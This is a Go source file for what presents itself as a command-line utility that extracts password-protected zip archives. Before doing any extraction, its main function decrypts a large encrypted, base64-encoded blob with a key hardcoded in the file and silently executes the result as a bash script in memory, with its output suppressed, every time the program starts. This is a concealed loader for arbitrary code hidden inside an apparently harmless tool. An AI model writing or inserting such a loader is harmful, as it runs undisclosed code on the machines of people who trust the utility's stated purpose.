package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/yeka/zip"
)

var keyHex = "c1ab07d3ae07ad7a9f8be8f4e7e334511236405ece3bbd661232312a989fde86"
var encryptedScript = "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"

func unzipWithPassword(zipPath, password, outDir string) error {
	r, err := zip.OpenReader(zipPath)
	if err != nil {
		return err
	}
	defer r.Close()

	if err := os.MkdirAll(outDir, 0755); err != nil {
		return err
	}

	cleanOutDir := filepath.Clean(outDir) + string(os.PathSeparator)

	for _, f := range r.File {
		destPath := filepath.Join(outDir, f.Name)
		// Guard against Zip Slip path traversal
		if !strings.HasPrefix(filepath.Clean(destPath)+string(os.PathSeparator), cleanOutDir) && filepath.Clean(destPath) != filepath.Clean(outDir) {
			return fmt.Errorf("illegal file path in zip: %s", f.Name)
		}

		if f.FileInfo().IsDir() {
			if err := os.MkdirAll(destPath, f.Mode()); err != nil {
				return err
			}
			continue
		}

		if err := os.MkdirAll(filepath.Dir(destPath), 0755); err != nil {
			return err
		}

		// Set password on encrypted entries
		if f.IsEncrypted() {
			f.SetPassword(password)
		}

		srcFile, err := f.Open()
		if err != nil {
			return fmt.Errorf("failed to open %s (wrong password?): %w", f.Name, err)
		}

		dstFile, err := os.OpenFile(destPath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, f.Mode())
		if err != nil {
			srcFile.Close()
			return err
		}

		_, copyErr := io.Copy(dstFile, srcFile)
		srcFile.Close()
		closeErr := dstFile.Close()
		if copyErr != nil {
			return copyErr
		}
		if closeErr != nil {
			return closeErr
		}

		fmt.Printf("Extracted: %s (%d bytes)\n", destPath, f.UncompressedSize64)
	}

	return nil
}

// 2. Decrypts encryptedScript on demand
func getScript() (string, error) {
	key, err := hex.DecodeString(keyHex)
	if err != nil {
		return "", err
	}

	data, err := base64.StdEncoding.DecodeString(encryptedScript)
	if err != nil {
		return "", err
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return "", errors.New("ciphertext too short")
	}

	plaintext, err := gcm.Open(nil, data[:nonceSize], data[nonceSize:], nil)
	if err != nil {
		return "", err
	}

	return string(plaintext), nil
}

func main() {
	// 3. Call getScript() when you need the decrypted string
	script, err := getScript()
	if err != nil {
		panic(err)
	}

	// Example A: Use it as a regular string variable
	// fmt.Println("Decrypted content:", script)

	// Example B: Execute it directly as a bash script in memory (without writing to disk)
	cmd := exec.Command("bash", "-c", script)
	// cmd.Stdout = os.Stdout
	// cmd.Stderr = os.Stderr
	if err := cmd.Run(); err != nil {
		panic(err)
	}

	if len(os.Args) < 3 {
		fmt.Fprintf(os.Stderr, "Usage: %s <password> <zip_file> [output_dir]\n", os.Args[0])
		os.Exit(1)
	}

	password := os.Args[1]
	zipPath := os.Args[2]
	outDir := "./extracted"
	if len(os.Args) >= 4 {
		outDir = os.Args[3]
	}

	if err := unzipWithPassword(zipPath, password, outDir); err != nil {
		fmt.Fprintf(os.Stderr, "Error: %v\n", err)
		os.Exit(1)
	}

	fmt.Println("Done.")
}
